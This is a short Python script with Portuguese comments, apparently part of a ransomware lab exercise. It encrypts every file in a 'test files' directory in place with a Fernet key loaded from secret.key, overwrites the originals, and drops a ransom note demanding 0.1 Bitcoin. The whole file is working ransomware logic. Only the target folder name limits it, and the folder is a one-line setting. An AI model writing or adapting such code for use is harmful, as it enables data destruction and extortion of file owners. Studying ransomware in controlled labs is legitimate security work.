# encrypt.py
# Script para criptografar os arquivos de teste

import os
from cryptography.fernet import Fernet

# Diretório dos arquivos de teste
target_dir = "arquivos_teste"

# Função para carregar a chave
def load_key():
    """Carrega a chave de criptografia do arquivo 'secret.key'."""
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        print("Erro: Chave 'secret.key' não encontrada. Execute key_manager.py primeiro.")
        exit()

def encrypt_files():
    key = load_key()
    cipher = Fernet(key)

    # Lista os arquivos no diretório
    files_to_encrypt = []
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            # Ignora o arquivo de resgate se ele já existir
            if file != "LEIA_ME.txt":
                files_to_encrypt.append(os.path.join(root, file))

    # Criptografa cada arquivo
    for file_path in files_to_encrypt:
        try:
            with open(file_path, "rb") as file:
                file_data = file.read()
            
            encrypted_data = cipher.encrypt(file_data)
            
            with open(file_path, "wb") as file:
                file.write(encrypted_data)
            
            print(f"Arquivo criptografado: {file_path}")
        except Exception as e:
            print(f"Erro ao criptografar {file_path}: {e}")

    # Deixa a mensagem de resgate
    rescue_message = """
Seus arquivos foram criptografados!

Para recuperá-los, você precisa da chave de descriptografia.
Envie 0.1 Bitcoin para o endereço X e nos contate em Y com o ID da transação.

Não tente recuperar seus arquivos sozinho, ou você os destruirá para sempre.
"""

    with open(os.path.join(target_dir, "LEIA_ME.txt"), "w") as rescue_file:
        rescue_file.write(rescue_message)

    print("\nMensagem de resgate deixada em LEIA_ME.txt")

if __name__ == '__main__':
    encrypt_files()
